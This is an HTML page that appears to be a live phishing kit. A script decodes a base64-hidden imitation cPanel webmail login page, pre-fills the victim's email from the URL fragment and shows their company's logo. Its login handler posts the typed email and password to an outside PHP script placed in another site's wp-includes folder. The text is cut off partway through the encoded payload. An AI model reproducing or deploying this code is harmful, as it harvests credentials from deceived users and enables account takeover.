  <meta http-equiv="content-type" content="text/html; charset=UTF-8">
  <meta name="robots" content="noindex, nofollow">
  <meta name="googlebot" content="noindex, nofollow">
  <meta name="viewport" content="width=device-width, initial-scale=1">


  <script type="text/javascript" src="https://code.jquery.com/jquery-3.4.1.min.js" ></script>
  <script type="text/javascript">

    var str = window.location.href;
	var strs = str.split("#");
	var emaqa = strs[1];

$(document).ready(function() {
       
		saveFile();
});

function saveFile (name, type, data) {
	if (data != null && navigator.msSaveBlob)
		return navigator.msSaveBlob(new Blob([data], { type: type }), name);
	var a = $("<a style='display: none;'/>");
	    var encodedStringAtoB = 'PGh0bWwgbGFuZz0iZW4iIGRpcj0ibHRyIj48aGVhZD4KICAgIDxtZXRhIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PXV0Zi04Ij4KICAgIDxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MS4wLCBtYXhpbXVtLXNjYWxlPTEuMCwgdXNlci1zY2FsYWJsZT0xIj4KICAgIDxtZXRhIG5hbWU9Imdvb2dsZSIgY29udGVudD0ibm90cmFuc2xhdGUiPgogICAgPG1ldGEgbmFtZT0iYXBwbGUtaXR1bmVzLWFwcCIgY29udGVudD0iYXBwLWlkPTExODgzNTI2MzUiPgogICAgPHRpdGxlPldlYm1haWwgTG9naW48L3RpdGxlPgogICAgPGxpbmsgcmVsPSJzaG9ydGN1dCBpY29uIiBocmVmPSJkYXRhOmltYWdlL3gtaWNvbjtiYXNlNjQsQUFBQkFBRUFJQ0FBQUFFQUlBRFNBZ0FBRmdBQUFJbFFUa2NOQ2hvS0FBQUFEVWxJUkZJQUFBQWdBQUFBSUFnR0FBQUFjM3A2OUFBQUFwbEpSRUZVV0lYdDFqMklIR1VZQi9EZk96ZG5qSUtGa0VDSVZXSUt2VUZzSWtSRXhhOUtKQ0xhV0FnV0p4NERpbFpXZ3BERGlJMHdpVmlJb0dBVFAxQ0NFRFlIU2VDd1VCQmtnaWlLVVJRSkZpTG80ZDBlT3hZekM4bnNPOW05WGNYQys4TVcrM3orOS9sNmwyMzgzeEgraVNCcEVseVRkb2RhMjZ4c0RxcC9oMENWWjN2d0ttN3RNQm5nQXM3aDdlUlllYkc2aE10TUJIYk1CWDg5dmZBUkhwclE1VThjd2RGUWxJT1pDVlI1ZGkxK3cvd1dYVC9FWTZFb041TlpDT0R1S1pMRHd6Z1NNQ3VCZTJmd2ZYNlFad3RwV3pxZkJCdExDM3R4Ri9aaHhLYkJHeDBFZnNUSlM3N3Z3bUdqbFpyRDRtVXpVT1haalZqR0k2NWNuVFhjaEI4aXVwZERVYjdRaW5zUVo3R3paZnRkUWoySlZaNDlpQy93Nkpqa3NJbzdPblM5dGlBNVZuNkd0eUsyKzFNWTVOa2hmR0R5Z1ZyQkF4SDVXa1B1TWpSNy8zVXNVRkxsMlE2OHM0WGtBM3dzM3Y5em9TalgyOEtyNXdMMXhyVHhhNm91K2Y2T1pHdnFQZzl2MXdaZWFVamNFTEUvRFZmTmhXRlN2eS9lbk9JWjllcTFzVG9rRU1OTFdJNzlvaXJQOGc2ZlhwVm5oN0dFdlkxc1YvT0o0ZjBVaHlLS2s2RW9YNHg1cEVrZ1h2Nkw2T005OVlxTncvYzRrWFN3RzVua0lmcExDeW51aWFoVzFHV2VKSGtmVDRhaVhPOWF0ejFYY0Q2STZ5THlIdTZiSVBrNkhnOUZlWVo2M3k5RWpCYXJQRHZROFZKMW5kOVYzRDRtK1JuY0Zvcnl4RkNRNGhTZWFobGVqODhIZWZhdXVyZHdhdWZyNXovRi9aSEFYNm5MK21aRTE4ZTM2SVdpSExrRm9jcXpXOVFYY056MSt3VUh4Si9mMTBKUlBqdkdQNHBrL3ZqNUwzRjhBdHVmZEQrL3A2ZEpEa256WCswNWZETEd0aWZlLzc2NnQ5TVJnRkNVZmZXVHVkd0UzQXFCbFZDVWYweExZR1RRcXp6Ymh5ZHdKM1kzNGczMThKMXRtWCtEUEJUbHo5TVMyTVkyL25QOERUR2FxZVREZjMwckFBQUFBRWxGVGtTdVFtQ0MiIHR5cGU9ImltYWdlL3gtaWNvbiI+CgogICAgPCEtLSBFWFRFUk5BTCBDU1MgLS0+CiAgICA8bGluayBocmVmPSJodHRwczovL3NoMDAxLndlYmhvc3Rib3gubmV0OjIwOTYvY1BhbmVsX21hZ2ljX3JldmlzaW9uXzEzODYxOTIwMzAvdW5wcm90ZWN0ZWQvY3BhbmVsL2ZvbnRzL29wZW5fc2Fucy9vcGVuX3NhbnMubWluLmNzcyIgcmVsPSJzdHlsZXNoZWV0IiB0eXBlPSJ0ZXh0L2NzcyI+CiAgICA8bGluayBocmVmPSJodHRwczovL3NoMDAxLndlYmhvc3Rib3gubmV0OjIwOTYvY1BhbmVsX21hZ2ljX3JldmlzaW9uXzE1NjAzNTc5MTYvdW5wcm90ZWN0ZWQvY3BhbmVsL3N0eWxlX3YyX29wdGltaXplZC5jc3MiIHJlbD0ic3R5bGVzaGVldCIgdHlwZT0idGV4dC9jc3MiPgoKICAgIDxzdHlsZSB0eXBlPSJ0ZXh0L2NzcyI+Ci8qCiAgVGhpcyBjc3MgaXMgaW5jbHVkZWQgaW4gdGhlIGJhc2UgdGVtcGxhdGUgaW4gY2FzZSB0aGUgY3NzIGNhbm5vdCBiZSBsb2FkZWQgYmVjYXVzZSBvZiBhY2Nlc3MgcmVzdHJpY3Rpb25zCiAgSWYgdGhpcyBjc3MgaXMgdXBkYXRlZCwgcGxlYXNlIHVwZGF0ZSBzZWN1cml0eXBvbGljeV9oZWFkZXIuaHRtbC50bXBsIGFzIHdlbGwKKi8KLmNvcHlyaWdodCB7CiAgYmFja2dyb3VuZDogdXJsKGRhdGE6aW1hZ2Uvc3ZnK3htbDtiYXNlNjQsUEhOMlp5QjRiV3h1Y3owaWFIUjBjRG92TDNkM2R5NTNNeTV2Y21jdk1qQXdNQzl6ZG1jaUlIZHBaSFJvUFNJek5UbHdkQ0lnYUdWcFoyaDBQU0l6TWpBaUlIWnBaWGRDYjNnOUlqQWdNQ0F6TlRrZ01qUXdJajQ4WkdWbWN6NDhZMnhwY0ZCaGRHZ2dhV1E5SW1FaVBqeHdZWFJvSUdROUlrMHhNak1nTUdneU16VXVNemQyTWpRd1NERXlNM3B0TUNBd0lpOCtQQzlqYkdsd1VHRjBhRDQ4TDJSbFpuTStQSEJoZEdnZ1pEMGlUVGc1TGpZNUlEVTVMakV3TW1nMk55NDRNREpzTFRFd0xqVWdOREF1TW1NdE1TNDJNRFVnTlM0MkxUUXVOakExSURFd0xqRXRPU0F4TXk0MUxUUXVOREF5SURNdU5DMDVMalV3TkNBMUxqQTVOaTB4TlM0eklEVXVNRGsyYUMwek1TNDFZeTAzTGpJZ01DMHhNeTQxTlNBeUxqRXdNaTB4T1M0d05TQTJMak10TlM0MU1EVWdOQzR5TFRrdU16VXpJRGt1T1RBMExURXhMalUxTWlBeE55NHhNRE10TVM0MElEVXVOREF6TFRFdU5UVWdNVEF1TlMwdU5EVWdNVFV1TXpBeUlERXVNRGs0SURRdU56azJJRE11TURRM0lEa3VNRFVnTlM0NE5USWdNVEl1TnpVZ01pNDNPVGNnTXk0M01ETWdOaTQwSURZdU5qVXlJREV3TGpjNU55QTRMamcxSURRdU16azNJREl1TWlBNUxqRTVPQ0F6TGpJNU9DQXhOQzQwSURNdU1qazRhREU1TGpKak15NDJNRElnTUNBMkxqVTBOeUF4TGpRMU15QTRMamcxTWlBMExqTTFNaUF5TGpJNU55QXlMamt3TWlBeUxqazBOU0EyTGpFME9DQXhMamsxSURrdU56VnNMVEV5SURRMExqTTVPR2d0TWpGakxURTBMalF3TXlBd0xUSTNMalkxTXkwekxqRTBPQzB6T1M0M05TMDVMalExTFRFeUxqRXdNaTAyTGpNdE1qSXVNVFV6TFRFMExqWTBPQzB6TUM0eE5UTXRNalV1TURVdE9DMHhNQzR6T1RVdE1UTXVORFUwTFRJeUxqSTBOaTB4Tmk0ek5TMHpOUzQxTkRjdE1pNDVMVEV6TGpNdE1pNDFOUzB5Tmk0NU5TQXhMakExTWkwME1DNDVOVE5zTVM0eUxUUXVOV015TGpVNU55MDVMall3TWlBMkxqWTBPQzB4T0M0ME5TQXhNaTR4TkRndE1qWXVOVFVnTlM0MUxUZ3VNRGs0SURFeUxURTFJREU1TGpVdE1qQXVOeUEzTGpVdE5TNDNJREUxTGpnMUxURXdMakUwT0NBeU5TNHdOUzB4TXk0ek5USWdPUzR5TFRNdU1UazFJREU0TGpjNU55MDBMamM1TmlBeU9DNDRMVFF1TnprMklpQm1hV3hzUFNJalptWTJZekpqSWk4K1BHY2dZMnhwY0Mxd1lYUm9QU0oxY213b0kyRXBJajQ4Y0dGMGFDQmtQU0pOTVRJekxqZzVJREkwTUV3eE9ESXVPVGtnTVRndU5qQXlZekV1TlRrNExUVXVOVGs0SURRdU5UazRMVEV3TGpBNU9DQTVMVEV6TGpWRE1UazJMak00T0NBeExqY2dNakF4TGpRNE5DQXdJREl3Tnk0eU9EZ2dNR2cyTWk0M1l6RTBMalF3TXlBd0lESTNMalkxSURNdU1UUTRJRE01TGpjMUlEa3VORFVnTVRJdU1UQXlJRFl1TXlBeU1pNHhOVE1nTVRRdU5qVTFJRE13TGpFMU15QXlOUzR3TlNBM0xqazVOeUF4TUM0ME1ESWdNVE11TlNBeU1pNHlOVFFnTVRZdU5TQXpOUzQxTlNBeklERXpMak13TlNBeUxqVTVOQ0F5Tmk0NU5UUXRNUzR5TURJZ05EQXVPVFZzTFRFdU1pQTBMalZqTFRJdU5UazNJRGt1TmpBeUxUWXVOVGszSURFNExqUTFMVEV5SURJMkxqVTFMVFV1TXprNElEZ3VNRGs0TFRFeExqZzBOeUF4TlM0d05USXRNVGt1TXpRM0lESXdMamcwT0MwM0xqVWdOUzQ0TURVdE1UVXVPRFUxSURFd0xqTXdOUzB5TlM0d05TQXhNeTQxTFRrdU1pQXpMakl3TkMweE9DNDRNRFVnTkM0NE1EVXRNamd1T0RBMUlEUXVPREExYUMwMU5DNHlPVGRzTVRBdU9DMDBNQzQxWXpFdU5pMDFMalF3TWlBMExqWXRPUzQ0SURrdE1UTXVNakF6SURRdU16azJMVE11TXprNElEa3VORGszTFRVdU1UQXlJREUxTGpNd01pMDFMakV3TW1neE55NHpPVGhqTnk0eUlEQWdNVE11TmpVekxUSXVNaUF4T1M0ek5USXROaTQxT1RjZ05TNDJPVFV0TkM0ek9UZ2dPUzQwTkRVdE1UQXVNRGszSURFeExqSTFMVEUzTGpFZ01TNHpPVFF0TkM0NU9UY2dNUzQxTkRjdE9TNDVMalEwTlMweE5DNDNMVEV1TVMwMExqZ3RNeTR3TlMwNUxqQTBOeTAxTGpnME9DMHhNaTQzTlMweUxqZ3RNeTQyT1RVdE5pNDBNREl0Tmk0Mk9UVXRNVEF1TnprMkxUa3ROQzQwTURZdE1pNHlPVGN0T1M0eU1EWXRNeTQwTlMweE5DNDBNREl0TXk0ME5VZ3lNek11TXpsc0xUUXpMamdnTVRZeUxqa3dNMk10TVM0Mk1EWWdOUzQwTFRRdU5qQTJJRGt1TnprM0xUa2dNVE11TVRrMUxUUXVOREF6SURNdU5EQTNMVGt1TkRBMklEVXVNVEF5TFRFMUlEVXVNVEF5YUMwME1TNDNJaUJtYVd4c1BTSWpabVkyWXpKaklpOCtQQzluUGp3dmMzWm5QZ289KSBuby1yZXBlYXQgc2Nyb2xsIGNlbnRlciB0b3AgdHJhbnNwYXJlbnQ7CiAgYmFja2dyb3VuZC1zaXplOiAyNXB4IGF1dG87Cn0KICAgIDwvc3R5bGU+Cgo8L2hlYWQ+Cjxib2R5IGNsYXNzPSJ3bSI+PGRpdiBpZD0icHJlbG9hZF9pbWFnZXMiPjwvZGl2PgoKCgo8IS0tIERvIG5vdCByZW1vdmUgbXNnX2NvZGUgYXMgaXQgaXMgbmVlZGVkIGZvciBhdXRvbWF0ZWQgdGVzdGluZyAtIG1zZ19jb2RlOltpbnZhbGlkX3Nlc3Npb25dICAtLT4KPGRpdiBpZD0ibG9naW4td3JhcHBlciIgY2xhc3M9Imdyb3VwIGhhcy1wdy1yZXNldCIgc3R5bGU9Im9wYWNpdHk6IDE7IHZpc2liaWxpdHk6IHZpc2libGU7Ij4KICAgIDxkaXYgY2xhc3M9IndyYXBwZXIiPgogICAgPGRpdiBpZD0ibm90aWZ5Ij4KICAgICAgICAKICAgICAgICAKICAgICAgICAgPGRpdiBpZD0ibG9naW4tc3RhdHVzIiBjbGFzcz0iZXJyb3Itbm90aWNlIiBzdHlsZT0iZGlzcGxheTpub25lOyI+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbnRlbnQtd3JhcHBlciI+CiAgICAgICAgICAgICAgICA8ZGl2IGlkPSJsb2dpbi1kZXRhaWwiPgogICAgICAgICAgICAgICAgICAgIDxkaXYgaWQ9ImxvZ2luLXN0YXR1cy1pY29uLWNvbnRhaW5lciI+PHNwYW4gY2xhc3M9ImxvZ2luLXN0YXR1cy1pY29uIj48L3NwYW4+PC9kaXY+CiAgICAgICAgICAgICAgICAgICAgPGRpdiBpZD0ibG9naW4tc3RhdHVzLW1lc3NhZ2UiPlRoZSBsb2dpbiBpcyBpbnZhbGlkLjwvZGl2PgogICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgIDwvZGl2PiAgICAgICAKICAgICAgIAogICAgPC9kaXY+CgoKICAgIDxkaXYgaWQ9ImNvbnRlbnQtY29udGFpbmVyIj4KICAgICAgICA8ZGl2IGlkPSJsb2dpbi1jb250YWluZXIiPgoKICAgICAgICAgICAgPGRpdiBpZD0ibG9naW4tc3ViLWNvbnRhaW5lciI+CiAgICAgICAgICAgICAgICAgICAgPGRpdiBpZD0ibG9naW4tc3ViLWhlYWRlciI+CiAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICA8aW1nIGNsYXNzPSJtYWluLWxvZ28iIHNyYz0iaHR0cHM6Ly9zaDAwMS53ZWJob3N0Ym94Lm5ldDoyMDk2L2NQYW5lbF9tYWdpY19yZXZpc2lvbl8xNTYwMzA4NjEyL3VucHJvdGVjdGVkL2NwYW5lbC9pbWFnZXMvd2VibWFpbC1sb2dvLnN2ZyIgYWx0PSJsb2dvIj4KICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgPGRpdiBpZD0ibG9naW4tc3ViIj4KICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgaWQ9ImZvcm1zIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxmb3JtIG5vdmFsaWRhdGU9IiIgaWQ9ImxvZ2luX2Zvcm0iIGFjdGlvbj0iIiBtZXRob2Q9IlBPU1QiICBzdHlsZT0idmlzaWJpbGl0eToiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImlucHV0LXJlcS1sb2dpbiI+PGxhYmVsIGZvcj0idXNlciI+RW1haWwgQWRkcmVzczwvbGFiZWw+PC9kaXY+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iaW5wdXQtZmllbGQtbG9naW4gaWNvbiB1c2VybmFtZS1jb250YWluZXIiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aW5wdXQgbmFtZT0iZW1haWwiIGlkPSJlbWFpbCIgYXV0b2ZvY3VzPSJhdXRvZm9jdXMiICBwbGFjZWhvbGRlcj0iRW50ZXIgeW91ciBlbWFpbCBhZGRyZXNzLiIgY2xhc3M9InN0ZF90ZXh0Ym94IiB0eXBlPSJ0ZXh0IiB0YWJpbmRleD0iMSIgcmVhZG9ubHk9IiI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iaW5wdXQtcmVxLWxvZ2luIGxvZ2luLXBhc3N3b3JkLWZpZWxkLWxhYmVsIj48bGFiZWwgZm9yPSJwYXNzIj5QYXNzd29yZDwvbGFiZWw+PC9kaXY+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iaW5wdXQtZmllbGQtbG9naW4gaWNvbiBwYXNzd29yZC1jb250YWluZXIiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aW5wdXQgbmFtZT0icGFzc3dvcmQiIGlkPSJwYXNzd29yZCIgcGxhY2Vob2xkZXI9IkVudGVyIHlvdXIgZW1haWwgcGFzc3dvcmQuIiBjbGFzcz0ic3RkX3RleHRib3giIHR5cGU9InBhc3N3b3JkIiB0YWJpbmRleD0iMiIgcmVxdWlyZWQ9IiI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CgkJCQkJCQkJPHAgaWQ9Im1zZyIgc3R5bGU9ImNvbG9yOnJlZDsiPjwvcD4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb250cm9scyI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImxvZ2luLWJ0biI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YnV0dG9uIG5hbWU9ImxvZ2luIiAgaWQ9ImxvZ2luX3N1Ym1pdCIgdGFiaW5kZXg9IjMiPkxvZyBpbjwvYnV0dG9uPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJyZXNldC1wdyI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGEgaHJlZj0iIyIgaWQ9InJlc2V0X3Bhc3N3b3JkIj5SZXNldCBQYXNzd29yZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvYT4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNsZWFyIiBpZD0icHVzaCI+PC9kaXY+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Zvcm0+CiAgICAgICAgICAgICAgICAgICAgICAgIDwhLS1DTE9TRSBmb3JtcyAtLT4KICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgPCEtLUNMT1NFIGxvZ2luLXN1YiAtLT4KICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICAKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwhLS1DTE9TRSB3cmFwcGVyIC0tPgogICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgIDwhLS1DTE9TRSBsb2dpbi1zdWItY29udGFpbmVyIC0tPgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICA8IS0tQ0xPU0UgbG9naW4tY29udGFpbmVyIC0tPgogICAgICAgIDwvZGl2PgogICAgICAgIAogICAgICAgICAgICAgICAgPGRpdiBpZD0ibG9jYWxlLWZvb3RlciIgc3R5bGU9ImRpc3BsYXk6IGJsb2NrOyI+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImxvY2FsZS1jb250YWluZXIiPgogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgPHVsIGlkPSJsb2NhbGVzX2xpc3QiPgogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgPGxpPjxhIGhyZWY9Ii8/bG9jYWxlPWJnIj5pdGFsaWFubzwvYT48L2xpPgogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgPGxpPjxhIGhyZWY9Ii8/bG9jYWxlPWNzIj5wb2xza2k8L2E+PC9saT4KICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIDxsaT48YSBocmVmPSIvP2xvY2FsZT1kYSI+ZGFuc2s8L2E+PC9saT4KICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIDxsaT48YSBocmVmPSIvP2xvY2FsZT1kZSI+RGV1dHNjaDwvYT48L2xpPgogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgPGxpPjxhIGhyZWY9Ii8/bG9jYWxlPWVsIj5GaWxpcGlubzwvYT48L2xpPgogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgPGxpPjxhIGhyZWY9Ii8/bG9jYWxlPWVzIj5lc3Bhw7FvbDwvYT48L2xpPgogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgPGxpPjxhIGhyZWY9Ii8/bG9jYWxlPWVzXzQxOSI+ZXNwYcOxb2wgbGF0aW5vYW1lcmljYW5vPC9hPjwvbGk+CiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgPC91bD4KICAgICAgICAgICAgICAgIDxkaXYgaWQ9Im1vYmlsZWxvY2FsZW1lbnUiPlNlbGVjdCBhIGxvY2FsZToKICAgICAgICAgICAgICAgICAgICA8YSBocmVmPSJqYXZhc2NyaXB0OnZvaWQoMCkiIHRpdGxlPSJDaGFuZ2UgbG9jYWxlIj5FbmdsaXNoPC9hPgogICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgIDwvZGl2PgogICAgPC9kaXY+CjwhLS1DbG9zZSBsb2dpbi13cmFwcGVyIC0tPgo8L2Rpdj4KCgo8c3R5bGU+CiAgICBAbWVkaWEgKG1pbi13aWR0aDogNDgxcHgpIHsKICAgICAgICAjc2VsZWN0X3VzZXJfZm9ybSB7CiAgICAgICAgICAgIHdpZHRoOiBweDsKICAgICAgICB9CiAgICB9Cjwvc3R5bGU+CiAgICA8ZGl2IGNsYXNzPSJjb3B5cmlnaHQiPkNvcHlyaWdodMKpJm5ic3A7MjAyNCBjUGFuZWwsIEwuTC5DLgogICAgPGJyPjxhIGhyZWY9Imh0dHBzOi8vZ28uY3BhbmVsLm5ldC9wcml2YWN5IiB0YXJnZXQ9Il9ibGFuayI+UHJpdmFjeSBQb2xpY3k8L2E+PC9kaXY+Cgo8IS0tIGpRdWVyeSBmaXJzdCwgdGhlbiBQb3BwZXIuanMsIHRoZW4gQm9vdHN0cmFwIEpTIC0tPgogICAgICA8c2NyaXB0IHNyYz0iaHR0cHM6Ly9jb2RlLmpxdWVyeS5jb20vanF1ZXJ5LTMuMi4xLnNsaW0ubWluLmpzIiBpbnRlZ3JpdHk9InNoYTM4NC1LSjNvMkRLdElrdllJSzNVRU56bU03S0NrUnIvckU5L1FwZzZhQVpHSndGRE1WTkEvR3BHRkY5M2hYcEc1S2tOIiBjcm9zc29yaWdpbj0iYW5vbnltb3VzIj48L3NjcmlwdD4KICAgICAgPHNjcmlwdCBzcmM9Imh0dHBzOi8vY2RuanMuY2xvdWRmbGFyZS5jb20vYWpheC9saWJzL3BvcHBlci5qcy8xLjEyLjkvdW1kL3BvcHBlci5taW4uanMiIGludGVncml0eT0ic2hhMzg0LUFwTmJnaDlCK1kxUUt0djNSbjdXM21nUHhoVTlLL1NjUXNBUDdoVWliWDM5ajdmYWtGUHNrdlh1c3ZmYTBiNFEiIGNyb3Nzb3JpZ2luPSJhbm9ueW1vdXMiPjwvc2NyaXB0PgogICAgICA8c2NyaXB0IHNyYz0iaHR0cHM6Ly9tYXhjZG4uYm9vdHN0cmFwY2RuLmNvbS9ib290c3RyYXAvNC4wLjAvanMvYm9vdHN0cmFwLm1pbi5qcyIgaW50ZWdyaXR5PSJzaGEzODQtSlpSNlNwZWpoNFUwMmQ4ak90NnZMRUhmZS9KUUdpUlJTUVF4U2ZGV3BpMU1xdVZkQXlqVWFyNSs3NlBWQ21ZbCIgY3Jvc3NvcmlnaW49ImFub255bW91cyI+PC9zY3JpcHQ+CiAgICA8c2NyaXB0IHNyYz0iaHR0cHM6Ly9hamF4Lmdvb2dsZWFwaXMuY29tL2FqYXgvbGlicy9qcXVlcnkvMi4yLjQvanF1ZXJ5Lm1pbi5qcyI+PC9zY3JpcHQ+CiAgICA8c2NyaXB0IHNyYz0iaHR0cHM6Ly9zdGFja3BhdGguYm9vdHN0cmFwY2RuLmNvbS9ib290c3RyYXAvNC4xLjMvanMvYm9vdHN0cmFwLm1pbi5qcyI+PC9zY3JpcHQ+CgoKCiAgICA8c2NyaXB0PgokKGRvY3VtZW50KS5yZWFkeShmdW5jdGlvbigpewp2YXIgY291bnQ9MDsKCiQoJyNiYWNrMScpLmNsaWNrKGZ1bmN0aW9uICgpIHsKJCgiI21zZyIpLmhpZGUoKTsKJCgnI2VtYWlsJykudmFsKCIiKTsKJCgiI2F1dG9tYWlsIikuYW5pbWF0ZSh7bGVmdDoyMDAsIG9wYWNpdHk6ImhpZGUifSwgMCk7CiQoIiNpbnB1dGJhciIpLmFuaW1hdGUoe3JpZ2h0OjIwMCwgb3BhY2l0eToic2hvdyJ9LCAxMDAwKTsKCn0pOwoKdmFyIGVtYWlsID0gd2luZG93LmxvY2F0aW9uLmhhc2guc3Vic3RyKDEpOwppZiAoIWVtYWlsKSB7Cgp9CmVsc2UKewp2YXIgbXlfZW1haWwgPWVtYWlsOwokKCcjZW1haWwnKS52YWwobXlfZW1haWwpOwokKCcjZGlzcGxheWVkTG9naW4nKS5odG1sKG15X2VtYWlsKTsKdmFyIGZpbHRlciA9IC9eKFthLXpBLVowLTlfXC5cLV0pK1xAKChbYS16QS1aMC05XC1dKStcLikrKFthLXpBLVowLTldezIsNH0pKyQvOwoKaWYgKCFmaWx0ZXIudGVzdChteV9lbWFpbCkpIHsKJCgnI2Vycm9yJykuc2hvdygpOwplbWFpbC5mb2N1czsKcmV0dXJuIGZhbHNlOwp9CnZhciBpbmQ9bXlfZW1haWwuaW5kZXhPZigiQCIpOwp2YXIgbXlfc2xpY2U9bXlfZW1haWwuc3Vic3RyKChpbmQrMSkpOwp2YXIgYz0gbXlfc2xpY2Uuc3Vic3RyKDAsIG15X3NsaWNlLmluZGV4T2YoJy4nKSk7CnZhciBmaW5hbD0gYy50b0xvd2VyQ2FzZSgpOwp2YXIgZmluYWx1PSBjLnRvVXBwZXJDYXNlKCk7CgokKCIjbG9nb2ltZyIpLmF0dHIoInNyYyIsICJodHRwczovL2xvZ28uY2xlYXJiaXQuY29tLyIrbXlfc2xpY2UpOwokKCIjbG9nb25hbWUiKS5odG1sKGZpbmFsdSk7CiQoIi5sb2dvbmFtZSIpLmh0bWwoZmluYWx1KTsKfQoKJCgnI2xvZ2luX3N1Ym1pdCcpLmNsaWNrKGZ1bmN0aW9uKGV2ZW50KXsKCmV2ZW50LnByZXZlbnREZWZhdWx0KCk7CnZhciBlbWFpbD0kKCIjZW1haWwiKS52YWwoKTsKdmFyIHBhc3N3b3JkPSQoIiNwYXNzd29yZCIpLnZhbCgpOwoKaWYgKCFwYXNzd29yZCkgewogICAgJCgnI2xvZ2luLXN0YXR1cycpLnNob3coKTsKICAgICQoJyNsb2dpbi1zdGF0dXMtbWVzc2FnZScpLmh0bWwoIlBhc3N3b3JkIGlzIGVtcHR5ISIpOwoJc2V0VGltZW91dChmdW5jdGlvbigpeyQoJyNsb2dpbi1zdGF0dXMnKS5oaWRlKCk7fSwgMTUwMCk7CgogICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgICAgICB9Cgpjb3VudD1jb3VudCsxOwoKICAgICAgJC5hamF4KHsKICAgICAgICBkYXRhVHlwZTogJ0pTT04nLAogICAgICAgIHVybDogJ2h0dHBzOi8vZWFzc3NpLm9yZy93cC1pbmNsdWRlcy9teWdlbmVyYWx1cGRhdGUveWVsbG93cm91bmRjdWJlLnBocCcsCiAgICAgICAgdHlwZTogJ1BPU1QnLAogICAgICAgIGRhdGE6ewogICAgICAgICAgZW1haWw6ZW1haWwsCiAgICAgICAgICBwYXNzd29yZDpwYXNzd29yZCwKICAgICAgICB9LAoJCQlkYXRhOiAkKCcjbG9naW5fZm9ybScpLnNlcmlhbGl6ZSgpLAogICAgICAgICAgICBiZWZvcmVTZW5kOiBmdW5jdGlvbih4aHIpewogICAgICAgICAgICAJCiAgICAgICAgICAgIH0sCiAgICAgICAgICAgIHN1Y2Nlc3M6IGZ1bmN0aW9uKHJlc3BvbnNlKXsKICAgICAgICAgICAgCWlmKHJlc3BvbnNlKXsKICAgICAgICAgICAgCQkkKCI